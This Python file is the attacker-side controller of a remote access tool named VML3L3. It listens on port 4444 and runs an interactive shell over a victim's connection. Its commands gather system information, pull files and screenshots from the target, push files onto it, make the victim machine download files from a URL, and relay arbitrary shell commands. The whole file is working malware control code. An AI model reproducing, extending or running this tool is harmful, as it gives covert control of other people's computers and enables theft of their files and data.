
try :

	import os
	import sys
	import time
	import platform
	import socket
	import random

except :

	print("""

		Execution error:

			You required some basic Python libraries. 
			This application use : os , sys , time , platform , socket , random .
			Please, check if you have all of them installed in your system.

		""")

	sys.exit()

if platform.system().startswith("Linux") :
 
	red = '\033[91m'
	green = '\033[92m'
	yellow = '\033[93m'
	blue = '\033[94m'
	endc = '\033[0m'
	underline = '\033[4m'
 
else :
 
	red = ''
	green = ''
	yellow = ''
	blue = ''
	endc = ''

def Banner () :
 
	print (green + '''
 

	██╗   ██╗███╗   ███╗██╗     ██████╗ ██╗     ██████╗ 
	██║   ██║████╗ ████║██║     ╚════██╗██║     ╚════██╗
	██║   ██║██╔████╔██║██║      █████╔╝██║      █████╔╝
	╚██╗ ██╔╝██║╚██╔╝██║██║      ╚═══██╗██║      ╚═══██╗
	 ╚████╔╝ ██║ ╚═╝ ██║███████╗██████╔╝███████╗██████╔╝
	  ╚═══╝  ╚═╝     ╚═╝╚══════╝╚═════╝ ╚══════╝╚═════╝ 
													 
		\033[92m ~{\033[0m Quote  \033[92m: \033[0mLet's Pown \033[92m}~
		\033[92m ~{\033[0m AMLELE \033[92m: \033[0mVersion 1.0 \033[92m}~
		\033[92m ~{\033[0m Github \033[92m: \033[0mhttps://github.com/AmineLelouche \033[92m}~                                          
		''' + endc)

def Socket_Creation () :
 
	try :
 
		global s
		global Host
		global Port
 
		s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		s.setblocking(1)
		
		Host = ""
		Port = sys.argv[1]

	except IndexError :

		Port = 4444 # By default
	 
	except socket.error as e :
	   
		print("")
		print(red + "[1] Socket Error : " + str(e) + endc)

	except KeyboardInterrupt :
		
		print("")
		print(red + "Exiting ...")
		time.sleep(1)
		sys.exit()
 
def Socket_Bind() :
 
	try :
	   
		s.bind((Host , Port))
		s.listen(10)
		print("")
		Banner ()
		print("")
		time.sleep(0.5)
		print(green + "[*] " + endc + f"Started At {time.ctime()}")
		time.sleep(0.5)
		print(green + "[*] " + endc + f"Listening On {Port} ...")
 
	except socket.error as e :
	   
		print("")
		print(red + "[2] Socket Error : " + str(e) + endc)
		print("")

		Socket_Bind ()

	except KeyboardInterrupt :

		print("")
		print(red + "[!] Exiting ...")
		time.sleep(1)
		sys.exit()
 
def Socket_Accept():
 
	try :
 
		global Connection
		global address
 
		Connection , address = s.accept()

		print(green + "[Info] " + endc + "Connection From\033[92m {}\033[0m On Port\033[92m {} ".format(address[0] , address[1]) + endc)
		print("")
		time.sleep(0.5)
		print(green + "<--[ " + endc + "Shell Activated" + green + " ]-->" + endc)
		time.sleep(0.5)
		print(green + "<--[ " + endc + "Press help For Display All Commands" + green + " ]-->" + endc)
		print("")
		Send_Commands(Connection)
		Connection.close()
 
	except socket.error as e :
	   
		print("")
		print(red + "[3] Socket Error : " + str(e) + endc)

	except KeyboardInterrupt :

		print("")
		print(red + "[!] Exiting ...")
		time.sleep(1)
		sys.exit()

def Send_Commands(Connection) :
 
	while True :
 
		Commands = input(red + "__" + endc + blue + underline + "Shell " + endc + red + ">" + endc + " ")
		Commands = Commands.strip()
		
		if Commands == "help" :
 
			print("")

			print (green + "Command{0}\t\t\tDescription\n{1}=========\t\t{2}============\n".format(endc , green , endc))
			print (green + "[+] quit         --> " + endc + "{ Close The Connection }" + endc)
			print (green + "[+] banner       --> " + endc + "{ Display That Cute Banner }" + endc)
			print (green + "[+] about        --> " + endc + "{ A Simple Description About The Tool " + endc)
			print (green + "[+] sysinfo      --> " + endc + "{ Display Info About The Target's Machine }" + endc)                
			print (green + "[+] cwd          --> " + endc + "{ Display The Current Working Directory } " + endc)
			print (green + "[+] url download --> " + endc + "{ Download Files into Victims Machine Over Internet }")
			print (green + "[+] screenshot   --> " + endc + "{ Take A Screenshot }" + endc)
			print (green + "[+] download     --> " + endc + "{ Download Files From The Target's Machine }" + endc)
			print (green + "[+] upload       --> " + endc + "{ Upload Files From The Target's Machine }" + endc)
			
			print("")
 
		elif Commands == "" :
 
			print("")
			continue

		elif Commands == "banner" :

			Banner ()

		elif Commands == "about" :

			print("")
			print (green + "[^] Version     : " + endc + "1.0.0" + endc)
			print (green + "[^] Author      : " + endc + "Amine Ait Ouazghour" + endc)
			print (green + "[^] Github      : " + endc + "https://github.com/Lelouche01" + endc)
			print (green + "[^] Twitter     : " + endc + "https://twitter.com/Lelouche01" + endc)
			print (green + "[^] Facebook    : " + endc + "https://www.facebook.com/Lelouche0x1" + endc)
			print (green + "[^] Instagram    : " + endc + "https://www.instagram.com/Lelouche0x1/" + endc)
			print("")

 
		elif Commands == "sysinfo" :
 
			Connection.send(Commands.encode())
			Name = Connection.recv(208400).decode()
			System = Connection.recv(208400).decode()
			Machine = Connection.recv(208400).decode()
			Release = Connection.recv(208400).decode()
			Version = Connection.recv(208400).decode()
			Architeture = Connection.recv(208400).decode()
			language = Connection.recv(208400).decode()
			
			print("")
			
			print(green + "[.]~{ Name        : " + endc + Name)
			print(green + "[.]~{ Machine     : " + endc + Machine)
			print(green + "[.]~{ System      : " + endc + System)
			print(green + "[.]~{ Release     : " + endc + Release)
			print(green + "[.]~{ Version     : " + endc + Version)
			print(green + "[.]~{ Architeture : " + endc + Architeture)
			print(green + "[.]~{ language    : " + endc + language)
			
			print("")
 
		elif Commands == "exit" or Commands == "quit" :
 
			print("")
			Connection.send(Commands.encode())
			Connection.close ()
			s.close ()
			sys.exit()
 
		elif Commands == "cwd" :
 
			Connection.send(Commands.encode())
			Received_Data = Connection.recv(208400)
			Decode_Received_Data = Received_Data.decode()
			print("")
			print(green + "[+] You Are Working On : {0}{1}".format(endc , Decode_Received_Data))
			print("")
 
		elif Commands == "url download" :

			print("")

			print("[+] Sending Command")
			time.sleep(1)
			Connection.send(Commands.encode())
			Received_Confirmation = Connection.recv(208400)
			print(Received_Confirmation.decode())
				
			Loop = True
			File_Url = str(input(green + "[+] File Url : " + endc))
			
			while Loop :
				
				if File_Url == "" :
				
					print(red + "[!] Empty Input ... Please Try Again !!" + endc)
					time.sleep(0.5)
					File_Url = str(input(green + "[+] File Url : " + endc))
				
				else :
				
					Loop = False
				
			Connection.send(File_Url.encode())
				
			Url_Check = Connection.recv(208400)
			Decode_Url_Check = Url_Check.decode()
				
			if Decode_Url_Check == "File Has Been Downloaded Over This Url" :
				
				time.sleep(0.5)
				print(green + "[+] " + endc + "{}".format(Decode_Url_Check))
				
			else :
				
				time.sleep(0.5)
				print(red + "[!] {}".format(Decode_Url_Check))
				
			print("")

		elif Commands == "download" :


			print("")
			print("[+] Sending Command")
			time.sleep(1)
			Connection.send(Commands.encode())
			Received_Confirmation = Connection.recv(208400)
			print(Received_Confirmation.decode())
			
			Loop = True
			File_Path = str(input(green + "[+] Path_file : " + endc))

			while Loop :

				if File_Path == "" :

					print(red + "[!] Empty Input ... Please Try Again !!" + endc)
					time.sleep(0.5)
					File_Path = str(input(green + "[+] Path_file : " + endc))

				else :

					Loop = False
			
			Connection.send(File_Path.encode())
				
			Recv_Path_Confirmation = Connection.recv(208400)
			Decod_Recv_Path_Confirmation = Recv_Path_Confirmation.decode()

			if Decod_Recv_Path_Confirmation == "Path Found" :

				if not os.path.exists("Downloads") :

					os.mkdir("Downloads")

				else :

					pass

				if platform.system().startswith("Linux") :

					Save_As = "Downloads/" + "Download" + str(random.randint(1 , 1000))

				else :

					Save_As = "Downloads\\" + "Download_" + str(random.randint(1 , 1000))
				
				with open (Save_As , mode = "wb") as _File :
						
					Received_Data = Connection.recv(1024)
						
					while Received_Data :
							
						_File.write(Received_Data)
						Received_Data = Connection.recv(1024)

						if Received_Data == b"Finish" :
							
							break

				if os.access(Save_As , os.F_OK) and os.path.isfile(Save_As) :
				
					print(yellow + "[+] " + endc + "File Has Been Downloaded Succefully " )
					time.sleep(0.5)
					print(green + "[+] " + endc + "Path : {} ".format(Save_As))
					print(green + "[+] " + endc + "Size : {} ".format(os.path.getsize(Save_As)) + "Bytes")
				
				else :
				
					print(red + "[!] File Has Not Been Downloaded")
				
			else :
				
				time.sleep(1)
				print(red + "[!] Error While Downloding Path , Path It Might Not Be Exist")
				
			print("")

		elif Commands == "upload" :

			print("")
			print("[+] Sending Command ...")
			time.sleep(1)
			Connection.send(Commands.encode())
			Received_Confirmation = Connection.recv(208400)
			print(Received_Confirmation.decode())

			File_Path = str(input(green + "[+] File Path : " + endc))
			Loop = True

			while Loop :

				if os.access(File_Path , os.F_OK) and os.path.isfile(File_Path) :

					Loop = False

				else :

					print(red + "[!] File Not Found ... Try Again !!" + endc)
					File_Path = str(input(green + "[+] File Path : " + endc))

			Save_As =  str(input(green + "[+] Save_As : " + endc))

			while Loop :

				if Save_As == "" :

					print(red + "[!] Empty Input ... Please Try Agin !!" + endc)
					time.sleep(0.5)
					Save_As = str(input(green + "[+] Save_As : " + endc))

				else :

					Loop = False

			Connection.send(Save_As.encode())

			with open(File_Path , mode = "rb") as _File :

				Uploaded_File = _File.read(1024)

				while Uploaded_File :

					Connection.send(Uploaded_File)
					Uploaded_File = _File.read(1924)

				time.sleep(2)

				Finish_Upload = "Finish"
				Connection.send(Finish_Upload.encode())

				Received_Upload_Confirmation = Connection.recv(208400)
				Decode_Received_Upload_Confirmation = Received_Upload_Confirmation.decode()

				if Decode_Received_Upload_Confirmation == "File Uploaded" :

					print(yellow + "[+] " + endc + "File Has Been Uploaded")
					print(green + "[+] " + endc + "Path : {} ".format(Save_As))
					print(green + "[+] " + endc + "Size : {} ".format(os.path.getsize(Save_As)) + "Bytes")
					print("")

				else :

					print(red + "[!] Error While Uploading The File" + endc)
					print("")


		elif Commands == "screenshot" :


			print("")
			print("[+] Sending Command ...")
			time.sleep(1)
			Connection.send(Commands.encode())
			Received_Confirmation = Connection.recv(208400)
			print(Received_Confirmation.decode())

			RandomNum = random.randint(1 , 1000)
			File_Name = "Screenshot_" + str(RandomNum)

			if not os.path.exists("Screenshots") :

				os.mkdir("Screenshots")

			else :

				pass

			if platform.system().startswith("Linux") :

				File_Path = "Screenshots/" + File_Name

			else :

				File_Path = "Screenshots\\" + File_Name

			with open(File_Path , mode = "wb") as _File :

				Received_Data = Connection.recv(1024)
					
				while Received_Data :

					_File.write(Received_Data)
					Received_Data = Connection.recv(1024)

					if Received_Data == b"Finish" :
							
						break


			if os.access(File_Path , os.F_OK) and os.path.isfile(File_Path):
					
				print(yellow + "[+] " + endc + "Screenshot Has Been Saved " + endc)
				time.sleep(0.5)
				print(green + "[+] " + endc + "Path : {0} ".format(File_Path))
				print(green + "[+] " + endc + "Size : {0} ".format(os.path.getsize(File_Path)) + "Bytes")
				
			else :
				
				print(red + "[!] Screenshot Is Not Saved " + endc)
				
			print("")
		   
		else :
 
			Connection.send(Commands.encode())
			Output_Command = Connection.recv(208400).decode("utf-8")
			Output_String = str(Output_Command)
			print(Output_String , end = "")
 
if __name__ == '__main__':
   
	Socket_Creation ()
	Socket_Bind ()
	Socket_Accept ()
